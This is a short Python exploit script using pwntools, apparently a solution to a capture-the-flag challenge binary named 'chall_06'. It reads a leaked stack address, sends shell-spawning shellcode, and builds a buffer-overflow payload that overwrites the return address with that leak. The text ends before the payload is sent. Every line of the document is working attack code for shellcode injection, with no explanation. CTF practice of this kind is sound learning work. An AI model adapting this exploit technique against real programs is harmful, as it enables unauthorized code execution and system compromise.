from pwn import *
context.arch = 'amd64'
p = process('./chall_06')


p.recvuntil(b'again: ')
offset = 0x40 - 0x8



leak = int(p.recvline().decode('utf-8').strip(), 16)

shellcode = asm(shellcraft.sh())

p.sendline(shellcode)

payload = cyclic(offset) + p64(leak)